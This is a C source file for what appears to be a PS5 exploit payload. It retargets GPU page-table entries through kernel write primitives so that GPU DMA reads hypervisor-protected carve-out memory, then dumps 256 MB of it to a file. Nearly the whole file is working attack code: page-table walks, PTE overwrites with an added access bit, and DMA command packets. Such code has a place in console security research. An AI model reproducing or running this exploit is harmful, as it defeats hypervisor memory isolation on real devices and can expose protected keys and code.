/* probe90/gpread90.elf v2 — GPU-DMA READ of the HV carve-out, TLB-staleness fixed.
 *
 * v1 finding: the GPU-DMA READ + bit50 WORKS (T-A matched kernel_copyout), but the
 * 256-chunk carve-out sweep returned only TWO distinct 1MB chunks — the 2nd+ retarget
 * of the SAME victim leaf was IGNORED (GPU TLB caches victim.gva -> first phys). The
 * dump therefore held [0x60000000,0x60200000) repeated 128x.
 *
 * v2 fix: allocate NFRESH fresh garlic victims (one per 2MB carve-out chunk); each
 * victim leaf is retargeted EXACTLY ONCE, so the GPU walks the (fresh) page table on
 * first touch — no stale TLB entry. Each 2MB leaf serves two 1MB reads (off 0 / 1MB)
 * with no re-retarget. Staging + cmd buffers are never retargeted (TLB stays valid).
 *
 * Phases:
 *   T-A  READ-KNOWN: retarget victim0 -> kdata PA + bit50, DMA 4KB src->staging,
 *        compare vs kernel_copyout (proves READ + bit50).
 *   T-B  CARVEOUT:  one fresh victim per 2MB chunk; DMA 2x1MB -> /data/carveout.bin.
 *
 * Log: /data/kex_gpread90.txt   Dump: /data/carveout.bin
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <ps5/kernel.h>
#include <ps5/payload.h>

extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define PROT_GPU_READ   0x10
#define PROT_GPU_WRITE  0x20
#define MAP_NO_COALESCE 0x00400000u
#define DMEM_TYPE_GARLIC 0xb
#define DMEM_RANGE_END   0x400000000ull

#define GPU_PDE_VALID   0x1ull
#define GPU_PDE_IS_PTE  (1ull << 54)
#define GPU_PDE_TF      (1ull << 56)
#define GPU_PDE_BIT50   (1ull << 50)
#define GPU_ADDR_MASK   0x0000FFFFFFFFFFC0ull
#define GPU_ADDR_8K_MASK 0x0000FFFFFFFFE000ull
#define GPU_ADDR_2M_MASK 0x0000FFFFFFE00000ull

#define GVMSPACE_SIZE        0x100
#define GVMSPACE_PAGE_DIR_VA 0x38
#define DATA_BASE_GVMSPACE   0x2EEA570u

#define GPU_SUBMIT_IOCTL    0xC0108102u
#define PM4_TYPE3           3u
#define PM4_OPCODE_DMA_DATA 0x50u
#define PM4_SHADER_COMPUTE  1u

#define CPU_PG_V     0x001ull
#define CPU_PG_PS    0x080ull
#define CPU_PG_FRAME 0x000FFFFFFFFFF000ull
#define RAM_MAX      0x400000000ull

#define OFFSET_KERNEL_PMAP_STORE 0x28c84a8ull

#define CARVEOUT_BASE 0x60000000ull
#define CARVEOUT_SIZE 0x10000000ull   /* 256 MB */

#define NFRESH 128                     /* one fresh 2MB victim per carve-out chunk */
#define CHUNK  0x100000                /* 1 MB per DMA */

#define STAGE_FILL 0xA5u

static int      g_logfd = -1;
static uint64_t g_dmap;

static void logline(const char *m) {
  if (g_logfd >= 0) { write(g_logfd, m, strlen(m)); write(g_logfd, "\n", 1); fsync(g_logfd); }
  printf("%s\n", m);
}

typedef int (*fn_alloc_dmem)(off_t, off_t, size_t, size_t, int, off_t *);
typedef int (*fn_map_dmem)(void **, size_t, int, int, off_t, size_t);
typedef int (*fn_release_dmem)(off_t, size_t);
static fn_alloc_dmem   p_AllocateDirectMemory;
static fn_map_dmem     p_MapDirectMemory;
static fn_release_dmem p_ReleaseDirectMemory;

static int resolve_syms(void) {
  p_AllocateDirectMemory = (fn_alloc_dmem) dlsym(RTLD_DEFAULT, "sceKernelAllocateDirectMemory");
  p_MapDirectMemory      = (fn_map_dmem)   dlsym(RTLD_DEFAULT, "sceKernelMapDirectMemory");
  p_ReleaseDirectMemory  = (fn_release_dmem) dlsym(RTLD_DEFAULT, "sceKernelReleaseDirectMemory");
  if (!p_AllocateDirectMemory || !p_MapDirectMemory || !p_ReleaseDirectMemory) return -1;
  return 0;
}

static int read_phys(uint64_t pa, uint64_t *out) {
  if (pa >= RAM_MAX) return -1;
  return kernel_copyout((intptr_t)(g_dmap + pa), out, 8) == 0;
}

static uint64_t cpu_va_to_pa(uint64_t pml4_pa, uint64_t va) {
  uint64_t e;
  uint64_t i4=(va>>39)&0x1FF, i3=(va>>30)&0x1FF, i2=(va>>21)&0x1FF, i1=(va>>12)&0x1FF;
  if (pml4_pa >= RAM_MAX) return 0;
  if (!read_phys(pml4_pa+i4*8, &e) || !(e&CPU_PG_V)) return 0;
  uint64_t pdpt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pdpt_pa+i3*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFFULL);
  uint64_t pd_pa = e&CPU_PG_FRAME;
  if (!read_phys(pd_pa+i2*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL);
  uint64_t pt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pt_pa+i1*8, &e) || !(e&CPU_PG_V)) return 0;
  return (e&CPU_PG_FRAME)|(va&0xFFFULL);
}

typedef struct { uint64_t gva, phys, pte_pa, raw; int is_2m; } leaf_t;
#define MAX_LEAVES 65536
static leaf_t leaves[MAX_LEAVES];
static int     nleaves = 0;

static void add_leaf(uint64_t gva, uint64_t phys, uint64_t pte_pa, uint64_t raw, int is_2m) {
  if (nleaves < MAX_LEAVES) {
    leaves[nleaves].gva=gva; leaves[nleaves].phys=phys; leaves[nleaves].pte_pa=pte_pa;
    leaves[nleaves].raw=raw; leaves[nleaves].is_2m=is_2m;
  }
  nleaves++;
}

static void walk_vmid(intptr_t gvmspace_base, int vmid) {
  uint64_t page_dir_va = kernel_getlong(gvmspace_base + (intptr_t)vmid * GVMSPACE_SIZE + GVMSPACE_PAGE_DIR_VA);
  if (!page_dir_va) return;
  for (int i4 = 0; i4 < 512; i4++) {
    uint64_t pml4e;
    if (kernel_copyout((intptr_t)(page_dir_va + i4 * 8), &pml4e, 8) != 0 || !(pml4e & GPU_PDE_VALID)) continue;
    uint64_t pdpt_pa = pml4e & GPU_ADDR_MASK;
    for (int i3 = 0; i3 < 512; i3++) {
      uint64_t pdpe;
      if (!read_phys(pdpt_pa + i3 * 8, &pdpe) || !(pdpe & GPU_PDE_VALID)) continue;
      uint64_t pd_pa = pdpe & GPU_ADDR_MASK;
      for (int i2 = 0; i2 < 512; i2++) {
        uint64_t pde;
        if (!read_phys(pd_pa + i2 * 8, &pde) || !(pde & GPU_PDE_VALID)) continue;
        uint64_t gva2 = ((uint64_t)i4 << 39) | ((uint64_t)i3 << 30) | ((uint64_t)i2 << 21);
        if (pde & GPU_PDE_IS_PTE) {
          add_leaf(gva2, pde & GPU_ADDR_MASK, pd_pa + i2 * 8, pde, 1);
        } else {
          uint64_t frag = (pde >> 59) & 0x1F;
          uint64_t ptb_pa = pde & GPU_ADDR_MASK;
          for (int i1 = 0; i1 < 256; i1++) {
            uint64_t pte;
            if (!read_phys(ptb_pa + i1 * 8, &pte) || !(pte & GPU_PDE_VALID)) continue;
            if ((pte & GPU_PDE_TF) && frag == 4) {
              uint64_t subtab = pte & GPU_ADDR_MASK;
              for (int i1b = 0; i1b < 8; i1b++) {
                uint64_t leaf;
                if (!read_phys(subtab + i1b * 8, &leaf) || !(leaf & GPU_PDE_VALID)) continue;
                add_leaf(gva2 | ((uint64_t)i1 << 16) | ((uint64_t)i1b << 13),
                         leaf & GPU_ADDR_8K_MASK, subtab + i1b * 8, leaf, 0);
              }
            } else {
              uint64_t shift = (frag == 1) ? 13 : 16;
              add_leaf(gva2 | ((uint64_t)i1 << shift), pte & GPU_ADDR_MASK, ptb_pa + i1 * 8, pte, 0);
            }
          }
        }
      }
    }
  }
}

static void build_dma_data(uint32_t *pkt, uint64_t src_va, uint64_t dst_va, uint32_t len_bytes) {
  pkt[0] = ((PM4_TYPE3 & 3u) << 30) | ((5u & 0x3FFFu) << 16)
         | ((PM4_OPCODE_DMA_DATA & 0xFFu) << 8) | ((PM4_SHADER_COMPUTE & 1u) << 1);
  pkt[1] = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
  pkt[2] = (uint32_t)(src_va & 0xFFFFFFFFull);
  pkt[3] = (uint32_t)(src_va >> 32);
  pkt[4] = (uint32_t)(dst_va & 0xFFFFFFFFull);
  pkt[5] = (uint32_t)(dst_va >> 32);
  pkt[6] = len_bytes & 0x1FFFFFu;
}

static void build_desc(uint64_t *d, uint64_t cmd_gpu_va, uint32_t dword_count) {
  d[0] = ((cmd_gpu_va & 0xFFFFFFFFull) << 32) | 0xC0023F00ull;
  d[1] = (((uint64_t)(dword_count & 0xFFFFFu)) << 32) | ((cmd_gpu_va >> 32) & 0xFFFFull);
}

struct gc_submit { uint32_t pipe_id; uint32_t count; uint64_t cmd_buf_ptr; };

static int submit_read(int gc, uint8_t *cmd_va, uint64_t cmd_gva,
                       uint64_t src_gva, uint64_t dst_gva, uint32_t len) {
  memset(cmd_va, 0, 0x100 + 0x10);
  build_dma_data((uint32_t*)cmd_va, src_gva, dst_gva, len);
  build_desc((uint64_t*)(cmd_va + 0x100), cmd_gva, 7);
  struct gc_submit sub = { 0, 1, (uint64_t)(uintptr_t)(cmd_va + 0x100) };
  int r = ioctl(gc, GPU_SUBMIT_IOCTL, &sub);
  usleep(300 * 1000);
  return r;
}

static int changed_from_fill(uint8_t *p, uint32_t len) {
  for (uint32_t i = 0; i < len; i++) if (p[i] != STAGE_FILL) return 1;
  return 0;
}

static void hex8(char *b, const uint8_t *p, int n) {
  int o = 0;
  for (int i = 0; i < n && o < 60; i++) o += sprintf(b + o, "%02x", p[i]);
  b[o] = 0;
}

int main(void) {
  g_logfd = open("/data/kex_gpread90.txt", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
  g_dmap  = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DMAP_BASE;
  char b[400];

  intptr_t kb = payload_get_args()->kdata_base_addr;
  snprintf(b, sizeof b, "gpread90v2: kdata=0x%llx fw=0x%x dmap=0x%llx",
           (unsigned long long)kb, kernel_get_fw_version(), (unsigned long long)g_dmap);
  logline(b);

  if (resolve_syms() != 0) { logline("FAIL: resolve syms"); return 1; }
  int gc = open("/dev/gc", O_RDWR);
  if (gc < 0) gc = open("/dev/gc0", O_RDWR);
  if (gc < 0) { logline("FAIL: cannot open /dev/gc"); return 1; }

  const size_t SZ = 0x200000;
  int prot = PROT_READ | PROT_WRITE | PROT_GPU_READ | PROT_GPU_WRITE;

  /* NFRESH fresh victims + staging + cmd */
  enum { NBUF = NFRESH + 2, STAGING_IDX = NFRESH, CMD_IDX = NFRESH + 1 };
  void *gva[NBUF]; off_t goff[NBUF];
  memset(gva, 0, sizeof gva);
  for (int i = 0; i < NBUF; i++) {
    if (p_AllocateDirectMemory(0, DMEM_RANGE_END, SZ, SZ, DMEM_TYPE_GARLIC, &goff[i]) != 0 ||
        p_MapDirectMemory(&gva[i], SZ, prot, MAP_NO_COALESCE, goff[i], SZ) != 0) {
      snprintf(b, sizeof b, "FAIL: garlic alloc/map at idx %d", i);
      logline(b);
      return 1;
    }
  }

  uint64_t staging_gva = (uint64_t)(uintptr_t)gva[STAGING_IDX];
  uint64_t cmd_gva     = (uint64_t)(uintptr_t)gva[CMD_IDX];
  snprintf(b, sizeof b, "buffers: %d victims, victim0=0x%llx staging=0x%llx cmd=0x%llx",
           NFRESH, (unsigned long long)(uintptr_t)gva[0],
           (unsigned long long)staging_gva, (unsigned long long)cmd_gva);
  logline(b);

  intptr_t gvmspace_base = (intptr_t)kb + (intptr_t)DATA_BASE_GVMSPACE;

  /* kernel CR3 walk (known .data target) */
  uint64_t target_kva = (uint64_t)kb;
  uint64_t kp_kva     = (uint64_t)kb + OFFSET_KERNEL_PMAP_STORE;
  uint64_t kernel_cr3      = kernel_getlong((intptr_t)(kp_kva + 0x28)) & ~0xFFFull;
  uint64_t kernel_pml4_kva = kernel_getlong((intptr_t)(kp_kva + 0x20));
  if (!kernel_cr3 || (kernel_pml4_kva - g_dmap) != kernel_cr3) { logline("ABORT: kernel_pmap invariant"); return 1; }
  uint64_t target_pa = cpu_va_to_pa(kernel_cr3, target_kva);
  uint64_t anchor_pa = cpu_va_to_pa(kernel_cr3, (uint64_t)kb + 0x40);
  uint64_t anchor_kva = 0, anchor_dmap = 0;
  kernel_copyout((intptr_t)((uint64_t)kb + 0x40), &anchor_kva, 8);
  read_phys(anchor_pa, &anchor_dmap);
  if (!target_pa || anchor_kva == 0 || anchor_dmap != anchor_kva) { logline("ABORT: CR3 walk failed"); return 1; }
  snprintf(b, sizeof b, "target_kva=0x%llx target_pa=0x%llx (anchor PASS)",
           (unsigned long long)target_kva, (unsigned long long)target_pa);
  logline(b);

  /* find dev vmid */
  int dev_vmid = -1;
  for (int vm = 0; vm < 16 && dev_vmid < 0; vm++) {
    nleaves = 0; memset(leaves, 0, sizeof leaves);
    walk_vmid(gvmspace_base, vm);
    int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;
    for (int i = 0; i < n; i++) if (leaves[i].gva == (uint64_t)(uintptr_t)gva[0]) { dev_vmid = vm; break; }
  }
  snprintf(b, sizeof b, "dev vmid=%d", dev_vmid);
  logline(b);
  if (dev_vmid < 0) { logline("FAIL: no dev vmid"); return 1; }

  nleaves = 0; memset(leaves, 0, sizeof leaves);
  walk_vmid(gvmspace_base, dev_vmid);
  int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;
  snprintf(b, sizeof b, "dev vmid leaves=%d", n);
  logline(b);

  /* collect a 2MB leaf for each victim buffer (gva == cpu VA) */
  leaf_t vleaf[NFRESH];
  memset(vleaf, 0, sizeof vleaf);
  int n2m = 0;
  for (int i = 0; i < n; i++) {
    if (!leaves[i].is_2m) continue;
    uint64_t g = leaves[i].gva;
    for (int k = 0; k < NFRESH; k++) {
      if (vleaf[k].raw) continue;
      if (g == (uint64_t)(uintptr_t)gva[k]) { vleaf[k] = leaves[i]; n2m++; break; }
    }
  }
  snprintf(b, sizeof b, "victim 2MB leaves found: %d / %d", n2m, NFRESH);
  logline(b);
  if (n2m == 0) { logline("FAIL: no 2MB victim leaves"); return 1; }

  /* ================= T-A: READ-KNOWN (kernel .data 4KB) ================= */
  {
    leaf_t *v = &vleaf[0];
    uint64_t old = v->raw;
    uint64_t base = target_pa & ~0x1FFFFFull;
    uint64_t off  = target_pa & 0x1FFFFFull;
    uint64_t nw   = (old & ~GPU_ADDR_2M_MASK) | (base & GPU_ADDR_2M_MASK) | GPU_PDE_BIT50;
    static uint8_t ref[0x1000];
    kernel_copyout((intptr_t)target_kva, ref, sizeof ref);
    memset(gva[STAGING_IDX], STAGE_FILL, 0x1000);
    kernel_setlong((intptr_t)(g_dmap + v->pte_pa), nw);
    int rr = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, v->gva + off, staging_gva, 0x1000);
    kernel_setlong((intptr_t)(g_dmap + v->pte_pa), old);
    uint8_t *got = (uint8_t*)gva[STAGING_IDX];
    int match = (memcmp(got, ref, 0x1000) == 0);
    char hg[70], hr[70];
    hex8(hg, got, 32); hex8(hr, ref, 32);
    snprintf(b, sizeof b, "T-A READ-KNOWN: ioctl=%d match=%d got=%s ref=%s",
             rr, match, hg, hr);
    logline(b);
    if (!match) { logline("T-A RESULT: MISMATCH"); return 1; }
    logline("T-A RESULT: MATCH (READ + bit50 WORKS)");
  }

  /* ================= T-B: CARVEOUT dump (one fresh victim per 2MB) ================= */
  {
    int dumpfd = open("/data/carveout.bin", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
    if (dumpfd < 0) { logline("FAIL: cannot open /data/carveout.bin"); return 1; }

    int nchunks = (int)(CARVEOUT_SIZE / 0x200000ULL);
    if (nchunks > n2m) nchunks = n2m;
    snprintf(b, sizeof b, "T-B: %d chunks (2MB each) using one fresh victim per chunk", nchunks);
    logline(b);

    for (int k = 0; k < nchunks; k++) {
      leaf_t *v = &vleaf[k];
      uint64_t base = CARVEOUT_BASE + (uint64_t)k * 0x200000ULL;
      uint64_t old  = v->raw;
      uint64_t nw   = (old & ~GPU_ADDR_2M_MASK) | (base & GPU_ADDR_2M_MASK) | GPU_PDE_BIT50;

      kernel_setlong((intptr_t)(g_dmap + v->pte_pa), nw);

      /* read 1MB @ off=0 */
      memset(gva[STAGING_IDX], STAGE_FILL, CHUNK);
      int r0 = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, v->gva, staging_gva, CHUNK);
      int c0 = changed_from_fill((uint8_t*)gva[STAGING_IDX], CHUNK);
      write(dumpfd, gva[STAGING_IDX], CHUNK);

      /* read 1MB @ off=1MB */
      memset(gva[STAGING_IDX], STAGE_FILL, CHUNK);
      int r1 = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, v->gva + CHUNK, staging_gva, CHUNK);
      int c1 = changed_from_fill((uint8_t*)gva[STAGING_IDX], CHUNK);
      write(dumpfd, gva[STAGING_IDX], CHUNK);

      kernel_setlong((intptr_t)(g_dmap + v->pte_pa), old);

      char h0[20];
      hex8(h0, (uint8_t*)gva[STAGING_IDX], 8);
      snprintf(b, sizeof b, "T-B chunk %d base=0x%llx r=%d,%d changed=%d,%d",
               k, (unsigned long long)base, r0, r1, c0, c1);
      logline(b);
      fsync(dumpfd);
    }
    close(dumpfd);
    logline("T-B RESULT: CARVEOUT-DUMPED");
  }

  close(gc);
  logline("done");
  for (int i = 0; i < NBUF; i++) p_ReleaseDirectMemory(goff[i], SZ);
  return 0;
}
